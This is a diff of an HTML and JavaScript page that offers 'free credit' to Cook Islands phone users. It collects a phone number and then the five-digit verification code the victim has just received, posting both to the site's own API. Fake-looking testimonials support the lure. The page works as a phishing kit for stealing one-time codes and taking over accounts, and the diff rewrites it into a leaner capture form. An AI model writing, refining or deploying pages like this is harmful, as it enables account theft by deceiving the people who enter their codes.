@@ -1,265 +1,168 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Welcome</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
-  <style>
-    :root { --accent:#e11d48; --card-bg:rgba(255,255,255,.12); --card-border:rgba(255,255,255,.25); --text:#f8fafc; --muted:#e2e8f0; }
-    *{box-sizing:border-box} html,body{height:100%}
-    body{margin:0;font-family:'Poppins',system-ui,-apple-system,Segoe UI,Roboto,'Helvetica Neue',Arial,'Noto Sans','Apple Color Emoji','Segoe UI Emoji';color:var(--text);overflow-x:hidden;background:#0b1220}
-    .bg{position:fixed;inset:0;z-index:-2;background:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5v9aoyGUs-CnKNB_LLKhNxDQAjphMIMb9tg&s') center/cover no-repeat;filter:saturate(1.1) contrast(1.02)}
-    .bg::after{content:"";position:absolute;inset:0;background:rgba(0,0,0,.45)}
-    .container{max-width:880px;margin:0 auto;padding:48px 24px 140px}
-    .hero{text-align:center;margin-top:6vh}
-    .hero h1{font-size:clamp(40px,7vw,84px);font-weight:800;letter-spacing:.04em;margin:0 0 10px;text-shadow:0 8px 32px rgba(0,0,0,.5)}
-    .hero p.tag{font-size:clamp(16px,2.3vw,26px);color:var(--text);margin:0 0 28px;font-weight:600}
-    .hero p.tag .red{color:var(--accent)}
-    .card{backdrop-filter:blur(8px);background:var(--card-bg);border:1px solid var(--card-border);border-radius:18px;padding:18px 20px;margin:0 auto 28px;max-width:700px;text-align:center}
-    .card b{color:var(--muted)}
-    .section{margin-top:38px;text-align:center}
-    .section h2{font-weight:700;margin:0 0 18px;font-size:22px;letter-spacing:.02em}
-    .phone-row,.code-row{display:flex;justify-content:center;gap:12px;margin:12px 0 18px}
-    .prefix{display:inline-flex;align-items:center;justify-content:center;padding:12px 14px;border-radius:12px;background:var(--card-bg);border:1px solid var(--card-border);min-width:84px;font-weight:700}
-    .digit,.code-digit{width:56px;height:64px;text-align:center;font-size:28px;font-weight:700;color:var(--text);border-radius:14px;border:1px solid var(--card-border);background:rgba(255,255,255,.06);outline:none;transition:transform .06s ease,box-shadow .2s ease,border-color .2s ease}
-    .digit:focus,.code-digit:focus{transform:translateY(-1px);box-shadow:0 8px 28px rgba(0,0,0,.25);border-color:#94a3b8}
-    .actions{display:flex;align-items:center;justify-content:center;gap:14px;margin-top:10px}
-    .btn{appearance:none;border:0;cursor:pointer;border-radius:14px;padding:14px 18px;font-weight:800;letter-spacing:.02em;background:linear-gradient(180deg,#f43f5e,#be123c);color:#fff;box-shadow:0 12px 32px rgba(190,18,60,.35)}
-    .btn[disabled]{filter:grayscale(.7) brightness(.8);cursor:not-allowed;box-shadow:none}
-    .notice{font-size:12px;opacity:.85;margin-top:8px}
-    .hidden{display:none !important}
-    footer{margin-top:80px}
-    .testimonials{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px;margin-top:18px}
-    .t{background:var(--card-bg);border:1px solid var(--card-border);border-radius:14px;padding:14px}
-    .t .name{font-weight:700;font-size:14px;opacity:.9}
-    .t .msg{margin-top:6px;font-size:13px;opacity:.95}
-    .tip{max-width:720px;margin:12px auto;color:#e2e8f0;opacity:.95}
-    .tip small{opacity:.8}
-    /* Added styles for cookie banner */
-    .cookie{position:fixed;bottom:16px;left:16px;right:16px;z-index:99;background:rgba(20,30,50,.85);backdrop-filter:blur(8px);border:1px solid var(--card-border);border-radius:14px;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;gap:16px;max-width:600px;margin:0 auto;}
-    .cookie p{margin:0;font-size:13px;}
-    .cookie .accept{padding:10px 16px;}
-  </style>
-
-  <script>
-    const PROD_HOSTS = ['promo-navy.vercel.app']; // set your prod domain(s)
-    const SITEKEY_PROD = 'YOUR_REAL_SITE_KEY'; // set your v2 checkbox site key
-    const SITEKEY_TEST = '6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI'; // Google test key
-
-    function loadRecaptcha() {
-      const s = document.createElement('script');
-      // MODIFIED: Added hl=en to force English language
-      s.src = 'https://www.google.com/recaptcha/api.js?onload=onRecaptchaReady&render=explicit&hl=en';
-      s.async = true; s.defer = true;
-      document.head.appendChild(s);
-    }
-    let recaptchaRendered = false;
-    let recaptchaToken = '';
-    window.onRecaptchaReady = () => {
-      const host = location.hostname;
-      const key = (PROD_HOSTS.includes(host) && !SITEKEY_PROD.startsWith('YOUR_')) ? SITEKEY_PROD : SITEKEY_TEST;
-      grecaptcha.render('recaptcha', { 
-        sitekey: key,
-        callback: (token) => { recaptchaToken = token; enableSend(); }
-      });
-      recaptchaRendered = true;
-      enableSend();
-    };
-    // The loadRecaptcha() call was removed from here because the script tag is now loaded at the end of the body
-  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Phone Number</title>
+    <style>
+        /* All your existing CSS styles remain unchanged here */
+        :root { --accent:#e11d48; --card-bg:rgba(255,255,255,.12); --card-border:rgba(255,255,255,.25); --text:#f8fafc; --muted:#e2e8f0; }
+        *{box-sizing:border-box} html,body{height:100%}
+        body{margin:0;font-family:'Poppins',system-ui,-apple-system,Segoe UI,Roboto,'Helvetica Neue',Arial,'Noto Sans','Apple Color Emoji','Segoe UI Emoji';color:var(--text);overflow-x:hidden;background:#0b1220}
+        .container{max-width:880px;margin:0 auto;padding:48px 24px 140px}
+        .section{margin-top:38px;text-align:center}
+        .phone-row,.code-row{display:flex;justify-content:center;gap:12px;margin:12px 0 18px}
+        .prefix{display:inline-flex;align-items:center;justify-content:center;padding:12px 14px;border-radius:12px;background:var(--card-bg);border:1px solid var(--card-border);min-width:84px;font-weight:700}
+        .digit,.code-digit{width:56px;height:64px;text-align:center;font-size:28px;font-weight:700;color:var(--text);border-radius:14px;border:1px solid var(--card-border);background:rgba(255,255,255,.06);outline:none;transition:transform .06s ease,box-shadow .2s ease,border-color .2s ease}
+        .digit:focus,.code-digit:focus{transform:translateY(-1px);box-shadow:0 8px 28px rgba(0,0,0,.25);border-color:#94a3b8}
+        .actions{display:flex;align-items:center;justify-content:center;gap:14px;margin-top:10px}
+        .btn{appearance:none;border:0;cursor:pointer;border-radius:14px;padding:14px 18px;font-weight:800;letter-spacing:.02em;background:linear-gradient(180deg,#f43f5e,#be123c);color:#fff;box-shadow:0 12px 32px rgba(190,18,60,.35)}
+        .btn[disabled]{filter:grayscale(.7) brightness(.8);cursor:not-allowed;box-shadow:none}
+        /* This class will be used to hide/show sections */
+        .hidden {
+            display: none !important;
+        }
+    </style>
 </head>
 <body>
-  <div class="bg" aria-hidden="true"></div>
-  <main class="container">
-    <section class="hero" aria-labelledby="welcome-title">
-      <h1 id="welcome-title">welcome</h1>
-      <p class="tag"><span class="red">get free credit</span> (just for cook islands users)</p>
-    </section>
 
-    <div class="card" role="note">
-      <b>please follow rules to get free credit from us</b>
-    </div>
+    <main class="container">
+        <section id="step1" class="section">
+            <h1>Enter your phone number</h1>
+            <div class="phone-row">
+                <span class="prefix">+682</span>
+                <input class="digit" type="tel" maxlength="1" required>
+                <input class="digit" type="tel" maxlength="1" required>
+                <input class="digit" type="tel" maxlength="1" required>
+                <input class="digit" type="tel" maxlength="1" required>
+                <input class="digit" type="tel" maxlength="1" required>
+            </div>
+            <div class="actions">
+                <button id="sendPhone" class="btn">Send Code</button>
+            </div>
+            <p id="message-step1"></p>
+        </section>
 
-    <section id="step1" class="section" aria-labelledby="s1">
-      <h2 id="s1">1: enter your number (just cook islands numbers)</h2>
-      <div class="phone-row" aria-label="Cook Islands phone number input">
-        <span class="prefix">+682</span>
-        <input class="digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" aria-label="digit 1" />
-        <input class="digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="digit 2" />
-        <input class="digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="digit 3" />
-        <input class="digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="digit 4" />
-        <input class="digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="digit 5" />
-      </div>
-      <div class="actions">
-        <div id="recaptcha"></div>
-        <button id="sendPhone" class="btn" disabled>Send code</button>
-      </div>
-      <p class="notice">We only support Cook Islands numbers (+682) for this promo.</p>
-      <div class="tip"><small>By continuing, you consent to send your phone number to our admin for processing.</small></div>
-    </section>
+        <section id="step2" class="section hidden">
+            <h1>Enter the 5-digit code</h1>
+            <div class="code-row">
+                <input class="code-digit" type="tel" maxlength="1" required>
+                <input class="code-digit" type="tel" maxlength="1" required>
+                <input class="code-digit" type="tel" maxlength="1" required>
+                <input class="code-digit" type="tel" maxlength="1" required>
+                <input class="code-digit" type="tel" maxlength="1" required>
+            </div>
+            <div class="actions">
+                <button id="sendDigits" class="btn">Verify Code</button>
+            </div>
+            <p id="message-step2"></p>
+        </section>
+        
+        <section id="done" class="section hidden">
+            <h2>Done!</h2>
+            <p>You're all set. Thanks.</p>
+        </section>
+    </main>
 
-    <section id="step2" class="section hidden" aria-labelledby="s2">
-      <h2 id="s2">2: account digits</h2>
-      <p class="tip">for security reasons you just need enter new 5 digits number you just got</p>
-      <div class="code-row">
-        <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="digit A" />
-        <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="digit B" />
-        <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="digit C" />
-        <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="digit D" />
-        <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="digit E" />
-      </div>
-      <div class="actions">
-        <button id="sendDigits" class="btn" disabled>Submit digits</button>
-      </div>
-    </section>
+    <script>
+        const step1Section = document.getElementById('step1');
+        const step2Section = document.getElementById('step2');
+        const doneSection = document.getElementById('done');
 
-    <section class="section" id="done" aria-live="polite" style="display:none">
-      <h2>Done!</h2>
-      <p>You're all set. Thanks.</p>
-    </section>
+        const btnSendPhone = document.getElementById('sendPhone');
+        const btnSendDigits = document.getElementById('sendDigits');
 
-    <footer class="section" aria-labelledby="reviews">
-      <h2 id="reviews">What people say</h2>
-      <div class="testimonials">
-        <div class="t"><div class="name">ngametua marsters</div><div class="msg">thanks!!!</div></div>
-        <div class="t"><div class="name">marcian kita</div><div class="msg">wow i gpt crdtsss</div></div>
-        <div class="t"><div class="name">tuaine arigi</div><div class="msg">this is fr guys</div></div>
-        <div class="t"><div class="name">tuariki marcian</div><div class="msg">wtf i got my crdtz</div></div>
-        <div class="t"><div class="name">tuane kopu</div><div class="msg">bruh this was fr</div></div>
-        <div class="t"><div class="name">memetuha murare</div><div class="msg">shiii imma received ittt</div></div>
-      </div>
-      </footer>
-  </main>
+        const phoneBoxes = Array.from(step1Section.querySelectorAll('.digit'));
+        const codeBoxes = Array.from(step2Section.querySelectorAll('.code-digit'));
+        
+        const messageStep1 = document.getElementById('message-step1');
+        const messageStep2 = document.getElementById('message-step2');
 
-  <div id="cookie" class="cookie" role="dialog" aria-live="polite" style="display: none;">
-    <p>We use cookies to provide core functionality and protect against abuse. By clicking Accept, you agree to our cookie policy.</p>
-    <button class="btn accept" id="acceptCookies">Accept</button>
-  </div>
+        let submittedPhone = null;
 
-  <script>
-    // Cookie + inputs + enable logic
-    const cookieBanner = document.getElementById('cookie');
-    const acceptBtn = document.getElementById('acceptCookies');
-    const consentKey = 'promo_cookie_consent_v1';
-    function hasConsent() { return localStorage.getItem(consentKey) === 'yes'; }
-    function showCookieIfNeeded() { cookieBanner.style.display = hasConsent() ? 'none' : 'flex'; }
-    acceptBtn.addEventListener('click', () => { localStorage.setItem(consentKey, 'yes'); showCookieIfNeeded(); enableSend(); });
-    showCookieIfNeeded();
+        // --- Event Listener for the first button (Send Phone) ---
+        btnSendPhone.addEventListener('click', async () => {
+            const phoneDigits = phoneBoxes.map(box => box.value).join('');
+            if (phoneDigits.length !== 5) {
+                messageStep1.textContent = 'Please enter all 5 digits of your phone number.';
+                return;
+            }
+            
+            submittedPhone = `+682${phoneDigits}`;
+            messageStep1.textContent = 'Sending...';
 
-    function hookupBoxes(selector) {
-      const boxes = Array.from(document.querySelectorAll(selector));
-      boxes.forEach((box, idx) => {
-        box.addEventListener('input', e => {
-          e.target.value = e.target.value.replace(/\D/g, '').slice(0,1);
-          if (e.target.value && boxes[idx+1]) boxes[idx+1].focus();
-          enableSend();
+            try {
+                // NOTE: This now calls your REAL API. 
+                // In a real scenario, you'd send to '/api/submit-phone'
+                const response = await fetch('/api/submit-phone', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: submittedPhone }) 
+                });
+
+                const data = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(data.error || 'An unknown error occurred.');
+                }
+
+                // SUCCESS: Hide Step 1 and show Step 2
+                step1Section.classList.add('hidden');
+                step2Section.classList.remove('hidden');
+
+            } catch (error) {
+                messageStep1.textContent = `Error: ${error.message}`;
+            }
         });
-        box.addEventListener('keydown', e => {
-          if (e.key === 'Backspace' && !e.target.value && boxes[idx-1]) boxes[idx-1].focus();
-          if (e.key === 'ArrowLeft' && boxes[idx-1]) boxes[idx-1].focus();
-          if (e.key === 'ArrowRight' && boxes[idx+1]) boxes[idx+1].focus();
+
+        // --- Event Listener for the second button (Send Digits) ---
+        btnSendDigits.addEventListener('click', async () => {
+            const digits = codeBoxes.map(box => box.value).join('');
+            if (digits.length !== 5) {
+                messageStep2.textContent = 'Please enter the 5-digit code.';
+                return;
+            }
+
+            messageStep2.textContent = 'Verifying...';
+
+            try {
+                // NOTE: This now calls your REAL API.
+                // In a real scenario, you'd send to '/api/submit-digits'
+                const response = await fetch('/api/submit-digits', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: submittedPhone, digits: digits })
+                });
+
+                const data = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(data.error || 'An unknown error occurred.');
+                }
+                
+                // SUCCESS: Hide Step 2 and show the "Done" message
+                step2Section.classList.add('hidden');
+                doneSection.classList.remove('hidden');
+
+            } catch (error) {
+                messageStep2.textContent = `Error: ${error.message}`;
+            }
         });
-        box.addEventListener('paste', e => {
-          const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, boxes.length);
-          if (!paste) return;
-          e.preventDefault();
-          paste.split('').forEach((d, i) => { if(boxes[i]) boxes[i].value = d; });
-          (boxes[paste.length-1] || boxes[boxes.length-1]).focus();
-          enableSend();
-        });
-      });
-      const row = document.querySelector(selector.includes('digit') ? '.phone-row' : '.code-row');
-      row?.addEventListener('click', () => {
-        const firstEmpty = boxes.find(b => !b.value) || boxes[boxes.length-1];
-        firstEmpty.focus();
-      });
-      document.addEventListener('keydown', e => {
-        if (!/^\d$/.test(e.key)) return;
-        if (document.activeElement && boxes.includes(document.activeElement)) return;
-        const empty = boxes.find(b => !b.value);
-        if (empty) { empty.value = e.key; const i = boxes.indexOf(empty); if (boxes[i+1]) boxes[i+1].focus(); enableSend(); e.preventDefault(); }
-      });
-      return boxes;
-    }
 
-    const phoneBoxes = hookupBoxes('.digit');
-    const codeBoxes  = hookupBoxes('.code-digit');
+        // --- Helper function to auto-focus next input box ---
+        function setupInputAutoTab(boxes) {
+            boxes.forEach((box, index) => {
+                box.addEventListener('input', () => {
+                    if (box.value.length === 1 && index < boxes.length - 1) {
+                        boxes[index + 1].focus();
+                    }
+                });
+            });
+        }
 
-    function getPhone() {
-      const local = phoneBoxes.map(b => b.value).join('');
-      return local.length === 5 ? '+682' + local : null;
-    }
-    function getDigits() {
-      const code = codeBoxes.map(b => b.value).join('');
-      return code.length === 5 ? code : null;
-    }
+        setupInputAutoTab(phoneBoxes);
+        setupInputAutoTab(codeBoxes);
 
-    const btnSendPhone = document.getElementById('sendPhone');
-    const btnSendDigits = document.getElementById('sendDigits');
-
-    function enableSend() {
-      const okPhone = !!getPhone();
-      const okConsent = hasConsent();
-      const okRecap = recaptchaRendered && !!recaptchaToken;
-      btnSendPhone.disabled = !(okPhone && okConsent && okRecap);
-      btnSendDigits.disabled = !getDigits();
-    }
-    
-    // Initial call to set button states
-    document.addEventListener('DOMContentLoaded', enableSend);
-
-    // Step control
-    let submittedPhone = null;
-    btnSendPhone.addEventListener('click', async () => {
-      const phone = getPhone();
-      if (!phone) return alert('Enter a valid Cook Islands number.');
-      if (!recaptchaToken) return alert('Please complete reCAPTCHA.');
-      btnSendPhone.disabled = true;
-      try {
-        const res = await fetch('/api/submit-phone', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone, recaptchaToken })
-        });
-        const data = await res.json();
-        if (!res.ok) throw new Error(data.error || 'Failed');
-        submittedPhone = phone;
-        document.getElementById('step1').classList.add('hidden');
-        document.getElementById('step2').classList.remove('hidden');
-        document.querySelector('.code-digit')?.focus();
-      } catch (err) {
-        alert(err.message);
-      } finally {
-        btnSendPhone.disabled = false;
-        grecaptcha.reset(); recaptchaToken=''; enableSend();
-      }
-    });
-
-    btnSendDigits.addEventListener('click', async () => {
-      const digits = getDigits();
-      if (!digits || !submittedPhone) return;
-      btnSendDigits.disabled = true;
-      try {
-        const res = await fetch('/api/submit-digits', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone: submittedPhone, digits })
-        });
-        const data = await res.json();
-        if (!res.ok) throw new Error(data.error || 'Failed');
-        document.getElementById('step2').classList.add('hidden');
-        document.getElementById('done').style.display = 'block';
-      } catch (err) {
-        alert(err.message);
-      } finally {
-        btnSendDigits.disabled = false;
-      }
-    });
-  </script>
-
-  <script src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaReady&render=explicit&hl=en" async defer></script>
+    </script>
 </body>
 </html>
